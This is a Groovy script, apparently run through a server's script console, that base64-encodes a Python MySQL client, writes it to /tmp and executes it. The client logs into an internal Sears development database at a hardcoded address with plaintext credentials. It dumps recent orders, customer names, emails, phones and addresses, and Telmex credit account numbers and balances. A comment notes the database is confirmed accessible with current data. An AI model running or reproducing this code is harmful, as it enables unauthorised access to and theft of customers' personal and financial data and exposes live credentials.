// DEV Sears DB - CONFIRMED accessible, has current 2026 data
def pyScript = '''
import socket, struct, hashlib, sys
HOST='172.27.141.6'
PORT=3308
USER='apifincadodev'
PASS='1q2w3e4r5t6y'
DB='tienda'

queries = [
    ("RECENT_ORDERS", "SELECT id_pedido, fecha, id_forma_pago, total, estatus, email FROM pedidos WHERE fecha >= '2026-08-01' ORDER BY id_pedido DESC LIMIT 30"),
    ("PII_LATEST", "SELECT dp.id_pedido, dp.nombre, dp.apellidos, dp.email, dp.telefono, dp.calle, dp.colonia, dp.ciudad, dp.estado FROM datos_pedido dp INNER JOIN pedidos p ON dp.id_pedido=p.id_pedido WHERE p.fecha >= '2026-08-01' ORDER BY dp.id_pedido DESC LIMIT 30"),
    ("TELMEX_CREDIT_SAMPLE", "SELECT id, numero_cuenta, linea_credito, saldo_disponible, estatus FROM credito_clarotel_lineac ORDER BY id DESC LIMIT 20"),
    ("TELMEX_CREDIT_STATS", "SELECT COUNT(*) as total, SUM(linea_credito) as total_credito, SUM(saldo_disponible) as total_disponible FROM credito_clarotel_lineac WHERE estatus=1"),
    ("ALL_DBS", "SHOW DATABASES"),
]

def rp(s):
    h=b''
    while len(h)<4: h+=s.recv(4-len(h))
    l=struct.unpack('<I',h[:3]+b'\\x00')[0]
    sq=struct.unpack('B',h[3:4])[0]
    d=b''
    while len(d)<l: d+=s.recv(l-len(d))
    return sq,d

def auth(u,p,salt,db,sq):
    h1=hashlib.sha1(p.encode()).digest()
    h2=hashlib.sha1(h1).digest()
    h3=hashlib.sha1(salt+h2).digest()
    sc=bytes(bytearray(a^b for a,b in zip(bytearray(h3),bytearray(h1))))
    cap=0x0003f7cf
    pl=struct.pack('<IIB',cap,16777216,33)+b'\\x00'*23
    pl+=u.encode()+b'\\x00'+struct.pack('B',len(sc))+sc+db.encode()+b'\\x00'+b'mysql_native_password\\x00'
    return struct.pack('<I',len(pl))[:3]+struct.pack('B',sq)+pl

def do_query(s,q):
    pl=b'\\x03'+q.encode()
    s.sendall(struct.pack('<I',len(pl))[:3]+struct.pack('B',0)+pl)
    sq,d=rp(s)
    fb=struct.unpack('B',d[0:1])[0]
    if fb==0xff:
        print("  QUERY_ERR:"+d[9:].decode('latin1'))
        return
    if fb==0x00:
        print("  OK (no resultset)")
        return
    nc=fb if fb<251 else struct.unpack('<H',d[1:3])[0]
    for _ in range(nc): sq,_=rp(s)
    sq,_=rp(s)
    count=0
    while True:
        sq,rd=rp(s)
        if struct.unpack('B',rd[0:1])[0]==0xfe and len(rd)<9: break
        if struct.unpack('B',rd[0:1])[0]==0xff:
            print("  ERR:"+rd[9:].decode('latin1'))
            break
        pos=0
        cols=[]
        for _ in range(nc):
            b=struct.unpack('B',rd[pos:pos+1])[0]
            if b==0xfb: cols.append('NULL');pos+=1;continue
            if b<251: ln=b;pos+=1
            elif b==252: ln=struct.unpack('<H',rd[pos+1:pos+3])[0];pos+=3
            elif b==253: ln=struct.unpack('<I',rd[pos+1:pos+4]+b'\\x00')[0];pos+=4
            else: ln=struct.unpack('<Q',rd[pos+1:pos+9])[0];pos+=9
            cols.append(rd[pos:pos+ln].decode('latin1'))
            pos+=ln
        print('|'.join(cols))
        count+=1
    print("  ROWS="+str(count))

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(15)
    s.connect((HOST,PORT))
    sq,g=rp(s)
    salt=g[4:12]
    rp2=g.find(b'\\x00',4)+1+18
    salt+=g[rp2:g.find(b'\\x00',rp2)]
    s.sendall(auth(USER,PASS,salt,DB,sq+1))
    sq,r=rp(s)
    if struct.unpack('B',r[0:1])[0]==0xff:
        print("AUTH_FAIL:"+r[9:].decode('latin1'))
        sys.exit(1)
    print("AUTH_OK")
    for label,q in queries:
        print("\\n=== "+label+" ===")
        do_query(s,q)
    s.close()
except Exception as e:
    print("ERROR:"+str(e))
'''

def encoded = pyScript.bytes.encodeBase64().toString()
def cmd = ["bash", "-c", "echo '${encoded}' | base64 -d > /tmp/current.py && python /tmp/current.py 2>&1"]
def proc = cmd.execute()
def out = new StringBuilder()
proc.consumeProcessOutput(out, new StringBuilder())
proc.waitForOrKill(30000)
println out.toString()
